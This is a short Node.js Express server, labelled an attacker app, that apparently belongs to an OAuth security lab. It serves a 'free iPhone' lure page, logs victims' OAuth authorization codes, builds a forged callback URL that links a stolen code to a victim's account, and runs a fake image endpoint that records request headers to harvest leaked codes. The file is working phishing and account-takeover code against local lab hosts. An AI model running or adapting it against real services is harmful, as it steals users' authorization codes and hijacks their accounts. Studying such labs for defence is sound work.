const path = require('path')
const express = require('express')
const ejs = require('ejs')

const app = express()
const port = 5001

app.engine('ejs', ejs.__express);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, './views'));

app.get('/', (req, res) => {
    res.send('<h1> Welcome, Do you want a free Iphone :)<h1>')
    console.log("Victim access code: "+req.query.code)
})


app.get('/win-iphone/', (req,res) => {
    

    
    // let attackURL = "http://oauth-provider.local/oauth/authorize/?response_type=code&client_id=q9O0kwqgxloGk5TPLzEF&redirect_uri=http://example-client.local/profile/link/oauth/callback";
    let code = req.query.code;
    let attackURL = "http://example-client.local/profile/link/oauth/callback/?code="+code;

    res.render('iphone', {
        attack_url: attackURL
    })
})
  
app.get('/fake-img.jpg', (req,res) => {
    console.log('-------- fake image headers ------');
    console.log(req.headers)
    console.log('------------')
    res.send('invalid')
})

app.listen(port, () => {
    console.log(`Attacker app listening on port ${port}`)
})